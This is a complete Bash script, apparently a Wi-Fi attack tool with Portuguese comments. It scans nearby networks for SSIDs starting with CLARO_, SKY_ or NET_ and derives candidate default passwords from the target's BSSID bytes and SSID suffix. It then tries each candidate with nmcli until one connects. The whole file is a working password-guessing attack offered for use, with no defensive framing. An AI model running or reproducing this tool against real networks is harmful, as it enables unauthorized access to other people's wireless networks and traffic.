#!/bin/bash

## Requisito:
## sudo apt-get install network-manager

# Constantes para facilitar a utilização das cores
GREEN='\033[32;1m'
BLUE='\033[34;1m'
RED='\033[31;1m'
RED_BLINK='\033[31;5;1m'
END='\033[m'

# Função chamada quando cancelar o programa com [Ctrl]+[c]
trap __Ctrl_c__ INT

__Ctrl_c__() {
   # __Clear__
    printf "\n${RED_BLINK} [!] Aborted task!${END}\n\n"
    exit 1
}

# Remove temp files de uma execução anterior
rm -rf /tmp/password* /tmp/ssid* /tmp/bssid* /tmp/temp*

# Banner
clear
echo " "
echo -e "${RED}              ╻ ╻╻┏━╸╻   ╺┳┓┏━┓┏━╸╻ ╻╺┳┓╺┳┓   ${END}"
echo -e "${RED}              ┃╻┃┃┣╸ ┃╺━╸ ┃┃╺━┫┣╸ ┃ ┃ ┃┃ ┃┃   ${END}"
echo -e "${RED}              ┗┻┛╹╹  ╹   ╺┻┛┗━┛╹  ┗━┛╺┻┛╺┻┛   ${END}"
echo -e "${RED}            https://github.com/caique-garbim  ${END}"
echo " "
echo -e " This tool searches for nearby Wi-Fi networks and performs"
echo -e " authentication attempts on the networks based on default"
echo -e "          passwords defined by the manufacturer."
echo " "
echo -e "${BLUE} [*] Possibly ${RED}vulnerable${END}${BLUE} wifi networks: ${END}"
echo " "

# Nmcli busca por redes wifi e joga a saída para temp.txt
nmcli -g bssid,ssid dev wifi | egrep "CLARO\_|SKY\_|NET\_" | grep -v "\#NET" > /tmp/temp.txt
# Sed limpa o temp.txt e salva em temp1.txt
cat /tmp/temp.txt | sed 's/\\//' | sed 's/\\//' | sed 's/\\//' | sed 's/\\//' | sed 's/\\//' > /tmp/temp1.txt
# Remove o temp.txt
rm -rf /tmp/temp.txt
# Separa o SSID em um arquivo
cat /tmp/temp1.txt | cut -d ":" -f7 > /tmp/ssid.txt
# Separa o BSSID em um arquivo
cat /tmp/temp1.txt | cut -d ":" -f1,2,3,4,5,6 > /tmp/bssid.txt
# Variavel QtdWifi recebe a quantidade de redes encontradas
QtdWifi=$(cat /tmp/temp1.txt | wc -l)
# Remove o temp1.txt
rm -rf /tmp/temp1.txt

# Monta menu para o usuário escolher
seq $QtdWifi > /tmp/temp.txt
for i in $(cat /tmp/temp.txt)
do
	echo " [$i]" >> /tmp/temp1.txt;
done
rm -rf /tmp/temp.txt
# Lista WiFis possivelmente vulneráveis no menu
paste -d ' ' /tmp/temp1.txt /tmp/ssid.txt
echo " "

# Usuario escolhe o WiFi para atacar
echo -ne " ${GREEN}Attack > ${END}"
read wifi

# Separa o WiFi escolhido para atacar
cat /tmp/ssid.txt | head -n$wifi | tail -n1 > /tmp/ssid_atk.txt
cat /tmp/bssid.txt | head -n$wifi | tail -n1 > /tmp/bssid_atk.txt

# Banner
clear
echo " "
echo -e "${RED}              ╻ ╻╻┏━╸╻   ╺┳┓┏━┓┏━╸╻ ╻╺┳┓╺┳┓   ${END}"
echo -e "${RED}              ┃╻┃┃┣╸ ┃╺━╸ ┃┃╺━┫┣╸ ┃ ┃ ┃┃ ┃┃   ${END}"
echo -e "${RED}              ┗┻┛╹╹  ╹   ╺┻┛┗━┛╹  ┗━┛╺┻┛╺┻┛   ${END}"
echo -e "${RED}            https://github.com/caique-garbim  ${END}"
echo " "
echo -e " This tool searches for nearby Wi-Fi networks and performs"
echo -e " authentication attempts on the networks based on default"
echo -e "          passwords defined by the manufacturer."
echo " "
echo -ne "${GREEN} [+] SSID:  "
cat /tmp/ssid_atk.txt
echo -ne "${GREEN} [+] BSSID: "
cat /tmp/bssid_atk.txt
echo -e "${END}"

# Monta a mini wordlist
# 3º byte em diante
cat /tmp/bssid_atk.txt | cut -d ":" -f3,4,5,6 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' > /tmp/password_atk.txt
# 2º byte em diante
cat /tmp/bssid_atk.txt | cut -d ":" -f2,3,4,5,6 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' >> /tmp/password_atk.txt
# 1º byte em diante
cat /tmp/bssid_atk.txt | cut -d ":" -f1,2,3,4,5,6 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' >> /tmp/password_atk.txt
# Alterando o último byte (3º byte em diante)
cat /tmp/ssid_atk.txt | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
cat /tmp/bssid_atk.txt | cut -d ":" -f3,4,5 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' > /tmp/temp_bssidclean.txt
paste -d '' /tmp/temp_bssidclean.txt /tmp/temp_newbyte.txt >> /tmp/password_atk.txt
# Alterando o último byte (2º byte em diante)
cat /tmp/ssid_atk.txt | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
cat /tmp/bssid_atk.txt | cut -d ":" -f2,3,4,5 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' > /tmp/temp_bssidclean.txt
paste -d '' /tmp/temp_bssidclean.txt /tmp/temp_newbyte.txt >> /tmp/password_atk.txt
# Alterando o último byte (1º byte em diante)
cat /tmp/ssid_atk.txt | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
cat /tmp/bssid_atk.txt | cut -d ":" -f1,2,3,4,5 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' |sed 's/://' | sed 's/://' | sed 's/://' > /tmp/temp_bssidclean.txt
paste -d '' /tmp/temp_bssidclean.txt /tmp/temp_newbyte.txt >> /tmp/password_atk.txt

# Exibe a wordlist
echo -e "${BLUE} [*] Passwords to try ${END}"
paste -d ' ' /dev/null /tmp/password_atk.txt

# Inicia as tentativas de autenticação
echo " "
echo -e "${RED} [*] Attacking${END}${RED_BLINK}...${END}"
rm -rf /tmp/password.txt

SSID=$(cat /tmp/ssid_atk.txt)
for pass in $(cat /tmp/password_atk.txt)
do
	sudo nmcli dev wifi connect $SSID password $pass >> /tmp/password.txt;
	cat /tmp/password.txt | grep '-' > /tmp/temp.txt
	OK=$(cat /tmp/temp.txt | wc -l)
	
	# Caso conseguir fazer a autenticação
	if [ $OK == "1" ]
	then
		echo " "
		echo -e "${GREEN} [+] Found password: $pass ${END}"
		echo " "
		echo -e "${BLUE} [*] Connecting...${END}"
		sudo nmcli dev wifi connect $SSID password $pass
		echo " "
		echo -e "${BLUE} [*] Removing temp files...${END}"
		rm -rf /tmp/password* /tmp/ssid* /tmp/bssid* /tmp/temp*
		echo -e "${BLUE} [*] Exiting...${END}"
		echo " "
		exit
	fi	
done

# Caso não conseguir fazer a autenticação
echo " "
echo -e "${RED} [!] Password not found.${END}"
echo -e "${BLUE} [*] Removing temp files...${END}"
rm -rf /tmp/password* /tmp/ssid* /tmp/bssid* /tmp/temp*
echo -e "${BLUE} [*] Exiting...${END}"
echo " "
exit
